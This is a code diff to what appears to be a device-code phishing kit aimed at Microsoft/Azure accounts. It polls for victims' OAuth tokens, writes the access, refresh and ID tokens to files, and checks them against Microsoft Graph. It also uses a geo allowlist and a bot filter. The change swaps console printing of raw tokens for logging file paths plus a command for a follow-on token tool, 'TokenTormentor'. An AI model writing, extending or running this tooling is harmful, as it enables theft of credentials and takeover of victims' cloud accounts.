@@ -41,7 +41,6 @@ const defaultConfig = {
     userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
     geoipallowlist: ["US","CA"],
     validateTokens: true,
-    printTokensOnCapture: true,
     graphValidationScope: "https://graph.microsoft.com/.default offline_access",
     botguard: {
         enabled: true,
@@ -209,11 +208,10 @@ function pollForAzureTokens(deviceCode, userCode, oauthConfig = config) {
                 if (pollResult.access_token) {
                     const resolved = await resolveCaptureIdentity(pollResult);
                     finalizeVisit(userCode, 'captured', resolved.identity.upn);
-                    logMessage(`Success, your Azure tokens for code ${userCode} were saved to ${config.tokenFile}`);
                     writeToFile(config.userCodesFile, userCode + '\n');
                     writeToFile(config.tokenFile, getTime() + formatAzureToken('Usercode: ' + userCode, pollResult));
                     writeToFile(userCode, JSON.stringify(pollResult, null, 4));
-                    logCaptureTokens(userCode, pollResult);
+                    logCaptureFiles(userCode);
                     if (config.validateTokens !== false) {
                         await validateCapturedTokens(userCode, pollResult, oauthConfig, resolved);
                     }
@@ -267,17 +265,17 @@ function formatAzureToken(userCode, pollResult) {
     return userCode + '\n' + JSON.stringify(pollResult, null, 4) + '\n\n';
 }
 
-function logCaptureTokens(userCode, pollResult) {
-    if (config.printTokensOnCapture === false) {
-        return;
-    }
-    logMessage(`ACCESS TOKEN (${userCode}):\n${pollResult.access_token}`);
-    if (pollResult.refresh_token) {
-        logMessage(`REFRESH TOKEN (${userCode}):\n${pollResult.refresh_token}`);
-    }
-    if (pollResult.id_token) {
-        logMessage(`ID TOKEN (${userCode}):\n${pollResult.id_token}`);
-    }
+function captureFilePath(relativePath) {
+    return path.isAbsolute(relativePath) ? relativePath : path.join(__dirname, relativePath);
+}
+
+function logCaptureFiles(userCode) {
+    const tokenJson = captureFilePath(userCode);
+    const archive = captureFilePath(config.tokenFile);
+    logMessage(`TOKENS SAVED — code=${userCode}`, 'success');
+    logMessage(`TokenTormentor: python TokenTormentor.py ${tokenJson}`);
+    logMessage(`Token JSON: ${tokenJson}`);
+    logMessage(`Archive: ${archive}`);
 }
 
 function sendThreemaNotifications() {
@@ -521,6 +519,7 @@ async function validateCapturedTokens(userCode, pollResult, oauthConfig = config
     }
 
     writeToFile(`${userCode}.graph-refresh.json`, JSON.stringify(refreshResult.body, null, 4) + '\n');
+    const refreshPath = captureFilePath(`${userCode}.graph-refresh.json`);
 
     graphResult = await testGraphMe(refreshResult.body.access_token);
     if (graphResult.status === 200) {
@@ -529,7 +528,7 @@ async function validateCapturedTokens(userCode, pollResult, oauthConfig = config
             `REFRESH OK + GRAPH OK — ${profile.displayName || profile.userPrincipalName} (${profile.userPrincipalName})`,
             'success'
         );
-        logMessage(`Refreshed Graph token saved to ${userCode}.graph-refresh.json`);
+        logMessage(`Refreshed token JSON: ${refreshPath}`);
         return;
     }
 
